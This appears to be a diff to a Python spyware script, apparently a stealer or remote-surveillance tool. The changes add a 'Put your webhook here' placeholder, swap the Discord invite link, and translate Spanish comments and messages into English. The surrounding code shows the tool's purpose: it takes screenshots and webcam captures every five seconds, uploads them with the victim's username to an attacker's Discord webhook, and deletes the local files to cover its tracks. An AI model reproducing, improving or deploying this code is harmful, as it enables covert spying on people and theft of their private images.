@@ -12,7 +12,7 @@ except ImportError:
     cv2 = None
 
 user = os.path.expanduser("~")
-hook = "webhook" 
+hook = "webhook" # Put your webhook here
 username = getpass.getuser()
 
 def generar_imagen_error():
@@ -113,8 +113,8 @@ def screen():
             webhook.add_file(file=f.read(), filename="webcam.png")
 
         embed = DiscordEmbed(
-            title="🖥 Discord: https://discord.gg/MSukhfr6k3",
-            description=f"Usuario: **{username}**\nNueva captura cada 5 segundos",
+            title="🖥 Discord: https://discord.gg/y92sn3EsWR",
+            description=f"Usuario: **{username}**\nNew capture every 5 seconds",
             color=0x2ECC71
         )
         embed.set_author(
@@ -132,9 +132,9 @@ def screen():
             os.remove(temp_path)
             os.remove(webcam_path)
         except Exception as e:
-            print(f"Error eliminando archivos: {e}")
+            print(f"Error deleting files: {e}")
 
-        time.sleep(5)
+        time.sleep(5) #time to take a screenshot
 
 if __name__ == "__main__":
     screen()
